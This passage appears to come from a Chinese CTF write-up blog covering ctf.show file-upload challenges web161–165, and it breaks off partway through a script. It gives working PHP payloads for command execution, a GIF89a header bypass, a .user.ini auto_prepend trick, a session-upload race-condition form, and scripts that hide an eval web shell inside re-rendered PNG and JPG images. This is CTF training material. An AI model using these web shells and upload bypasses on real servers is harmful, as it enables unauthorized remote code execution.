            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726151942012.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726151942012.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726151942012.png 2x"
            sizes="auto"
            alt="image-20230726151942012">
    </a></figure></p>
<p>上述UA头会引发报错，尝试<code>&lt;?php system('ls');?&gt;</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152150496.png" title="image-20230726152150496" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152150496.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152150496.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152150496.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152150496.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152150496.png 2x"
            sizes="auto"
            alt="image-20230726152150496">
    </a></figure></p>
<p>有预期回显，进一步修改：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system(&#39;ls ../&#39;);?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>确定flag.php的位置，tac读取flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system(&#39;tac ../flag.phpS&#39;);?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web161" class="headerLink">
    <a href="#web161" class="header-mark"></a>[web161]</h3><p>检测文件头</p>
<p>上传 <code>GIF89a</code>成功绕过</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png" title="image-20230726152634628" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png 2x"
            sizes="auto"
            alt="image-20230726152634628">
    </a></figure></p>
<p>其余思路同上
<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726153507813.png" title="image-20230726153507813" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726153507813.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726153507813.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726153507813.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726153507813.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726153507813.png 2x"
            sizes="auto"
            alt="image-20230726153507813">
    </a></figure></p>
<h3 id="web162" class="headerLink">
    <a href="#web162" class="header-mark"></a>[web162]</h3><p>检测了文件头，同时过滤了点<code>.</code></p>
<p><strong>session包含</strong></p>
<p>**条件竞争：**我们上传的文件如果不符合要求，就会被删除，导致成功上传无法访问，没有用。但是如果我们上传的速度比服务器删的速度快，就可以了。</p>
<p>修改ini文件内容</p>
<p>.user.ini:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89a
</span></span><span class="line"><span class="cl">auto_prepend_file=a
</span></span></code></pre></td></tr></table>
</div>
</div><p>随后修改并上传a文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89a
</span></span><span class="line"><span class="cl">&lt;?=include&#34;/tmp/sess_fllag&#34;?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>构造，session文件竞争包含poc:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://58b10a1f-08e0-4689-8b64-2e8641d2948b.chall.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;2333&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20230726155914013.png" title="image-20230726155914013" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20230726155914013.png">
        <img
            
            loading="lazy"
            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20230726155914013.png"
            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20230726155914013.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20230726155914013.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20230726155914013.png 2x"
            sizes="auto"
            alt="image-20230726155914013">
    </a></figure></p>
<p><code>Cookie:PHPSESSID=fllag</code></p>
<p><code>2333&lt;?php $code='&lt;?php eval($_POST[1]);?&gt;;file_put_contents('a.php',$code);?&gt;</code></p>
<p>也可以远程包含自己vps上的马</p>
<h3 id="web164" class="headerLink">
    <a href="#web164" class="header-mark"></a>[web164]</h3><p><strong>PNG二次渲染</strong></p>
<p>尝试上传图片，查看上传后的路径，存在文件包含</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">5</span><span class="n">b82c70e</span><span class="o">-</span><span class="n">ecd3</span><span class="o">-</span><span class="mi">4</span><span class="n">ebb</span><span class="o">-</span><span class="mi">9665</span><span class="o">-</span><span class="mi">11</span><span class="n">ce8c1a5b74</span><span class="o">.</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">show</span><span class="o">/</span><span class="n">download</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">image</span><span class="o">=</span><span class="mi">32</span><span class="n">d3ca5e23f4ccf1e4c8660c40e75f33</span><span class="o">.</span><span class="n">png</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里用到一个工具：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">huntergregal</span><span class="o">/</span><span class="n">PNG</span><span class="o">-</span><span class="n">IDAT</span><span class="o">-</span><span class="n">Payload</span><span class="o">-</span><span class="n">Generator</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>cmd命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python generate.py -m php -p ma.php -o a.png
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到a.png可以上传</p>
<p>上传后再执行命令：
get：<code>&amp;0=system</code>
post：<code>1=tac flag.php</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105340210.png" title="image-20230727105340210" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105340210.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105340210.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105340210.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105340210.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105340210.png 2x"
            sizes="auto"
            alt="image-20230727105340210">
    </a></figure></p>
<p>浏览器页面图片没有直接回显，下载图片也可以看到flag信息</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105450503.png" title="image-20230727105450503" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105450503.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105450503.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105450503.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105450503.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727105450503.png 2x"
            sizes="auto"
            alt="image-20230727105450503">
    </a></figure></p>
<p>另外还有php生成png二次渲染马的脚本，直接运行可生成png图片：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"> <span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="nv">$img</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;./1.png&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web165" class="headerLink">
    <a href="#web165" class="header-mark"></a>[web165]</h3><p><strong>JPG二次渲染</strong></p>
<p>相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。</p>
<p>上传正常jpg图片后访问，抓包发到重放器中，发现图片经过二次渲染
<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png" title="image-20230727111023352" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png 2x"
            sizes="auto"
            alt="image-20230727111023352">
    </a></figure></p>
<p>与png图片二次渲染的区别在于，需要一张上传上去再下载下来的图片，然后跑脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php exp.php 1.jpg
</span></span></code></pre></td></tr></table>
</div>
</div><p>php脚本：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
</span></span></span><span class="line"><span class="cl"><span class="cm">It is necessary that the size and quality of the initial image are the same as those of the processed image.
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">1) Upload an arbitrary image via secured files upload script
</span></span></span><span class="line"><span class="cl"><span class="cm">2) Save the processed image and launch:
</span></span></span><span class="line"><span class="cl"><span class="cm">jpg_payload.php &lt;jpg_name.jpg&gt;
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">In case of successful injection you will get a specially crafted image, which should be uploaded again.
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">Since the most straightforward injection method is used, the following problems can occur:
</span></span></span><span class="line"><span class="cl"><span class="cm">1) After the second processing the injected data may become partially corrupted.
</span></span></span><span class="line"><span class="cl"><span class="cm">2) The jpg_payload.php script outputs &#34;Something&#39;s wrong&#34;.
</span></span></span><span class="line"><span class="cl"><span class="cm">If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">Sergey Bobrov @Black2Fan.
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">See also:
</span></span></span><span class="line"><span class="cl"><span class="cm">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$miniPayload</span> <span class="o">=</span> <span class="s2">&#34;&lt;?=eval(</span><span class="se">\$</span><span class="s2">_POST[1]);?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;gd&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;imagecreatefromjpeg&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php-gd is not installed&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">set_error_handler</span><span class="p">(</span><span class="s2">&#34;custom_error_handler&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$pad</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$pad</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="nv">$pad</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$nullbytePayloadSize</span> <span class="o">=</span> <span class="nv">$pad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$dis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataInputStream</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$outStream</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">!=</span> <span class="mh">0xFFD8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Incorrect SOI marker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
